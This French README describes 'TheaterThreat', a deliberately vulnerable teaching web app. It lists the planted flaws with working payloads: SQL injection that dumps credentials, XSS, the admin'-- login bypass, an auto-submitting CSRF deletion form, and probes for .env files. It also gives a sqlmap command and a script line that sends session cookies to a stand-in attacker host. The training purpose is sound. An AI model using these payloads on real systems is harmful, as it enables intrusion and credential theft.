# TheaterThreat - Plateforme Pédagogique de Sécurité Web

## 🚀 Installation

### Version Non-Sécurisée
Une application délibérément vulnérable pour apprendre la cybersécurité.

### Étapes pour lancer le site :
1. **Cloner le projet :**
    ```bash
    git clone https://github.com/votre-repo/theaterthreat-vulnerable.git
    cd theaterthreat-vulnerable
    ```

2. **Lancer avec Docker :**
    ```bash
    docker-compose up -d
    ```

3. **Accéder au site :**
    Ouvrez votre navigateur et accédez à l'URL suivante : `http://localhost:8080`

---

## 🔥 Failles Implantées (À Tester)

### 1. Injection SQL
- **Attaque :**
  ```sql
  /?search=' UNION SELECT username, password FROM users--
  ```
- **Impact :** Vol de données sensibles (mots de passe en clair).
- **Où tester :** Champ de recherche ou formulaire de login.

### 2. Cross-Site Scripting (XSS)
- **Attaque :**
  ```html
  /?xss=<script>alert('Pwned!')</script>
  ```
- **Impact :** Exécution de code malveillant dans le navigateur des victimes.
- **Où tester :** Tout champ de saisie ou paramètre URL.

### 3. Bypass d'Authentification
- **Attaque :**
  ```
  Identifiant : admin'--
  Mot de passe : [vide]
  ```
- **Impact :** Accès admin sans mot de passe.
- **Où tester :** Page de login (`/login.php`).

### 4. Accès Non Autorisé
- **Attaque :**
  ```
  /admin.php  # Accès sans être connecté
  ```
- **Impact :** Modification/suppression de données sans permission.
- **Où tester :** URLs sensibles sans vérification de session.

### 5. CSRF (Cross-Site Request Forgery)
- **Attaque :**
  ```html
  <!-- Sur un site malveillant -->
  <form action="http://theaterthreat/admin/delete_all" method="POST">
     <button>Cliquez ici</button>
  </form>
  <script>document.forms[0].submit()</script>
  ```
- **Impact :** Actions non autorisées déclenchées à l'insu de l'utilisateur.
- **Où tester :** Actions sensibles (changement d'email, suppression).

### 6. Exposition de Données
- **Attaque :**
  ```
  /.env
  /config.php.bak
  ```
- **Impact :** Fuite de clés secrètes et configurations.
- **Où tester :** Accès direct aux fichiers sensibles.

---

## 🛠 Comment Tester ?

### Méthode Manuelle
- **Injection SQL :**
  - Entrez `' OR 1=1--` dans le champ de recherche → Tous les DVDs s'affichent.
  - Essayez `' UNION SELECT 1,username,password,1 FROM users--` pour voler les identifiants.

- **XSS :**
  - Ajoutez `<script>alert(1)</script>` dans n'importe quel champ → Une alerte s'affiche.

- **Bypass Auth :**
  - Connectez-vous avec `admin'--` et n'importe quel mot de passe → Accès admin.

- **CSRF :**
  - Créez un fichier HTML avec le formulaire ci-dessus → Ouverture déclenche une suppression.

### Outils Automatisés
- **SQLMap pour l'injection SQL :**
  ```bash
  sqlmap -u "http://localhost:8080/?search=test" --dbs
  ```
- **Burp Suite :**
  Interceptez les requêtes et modifiez les paramètres.

---

## 📚 Scénarios Pédagogiques

- **Démo XSS :**
  Montrez comment voler un cookie de session.
  ```javascript
  <script>fetch('http://attaquant.com/?cookie='+document.cookie)</script>
  ```

- **Démo SQLi :**
  Affichez tous les utilisateurs via :
  ```sql
  ' UNION SELECT 1,username,password,1 FROM users--
  ```

- **Démo CSRF :**
  Créez une fausse page qui supprime un compte silencieusement.

---

## 🛡 Comparaison Version Sécurisée

| Faille              | Version Vulnérable | Version Sécurisée         |
|---------------------|--------------------|---------------------------|
| Injection SQL       | ✅ Exploitable    | ❌ Requêtes paramétrées    |
| XSS                 | ✅ Possible       | ❌ Échappement HTML        |
| Bypass Auth         | ✅ Fonctionne     | ❌ 2FA/Hash bcrypt         |
| CSRF                | ✅ Non-protégé    | ❌ Tokens uniques          |

---

## ⚠️ Consignes de Sécurité

- Ne pas déployer en production.
- Utiliser uniquement en réseau local isolé.
- Effacer les données sensibles après utilisation.
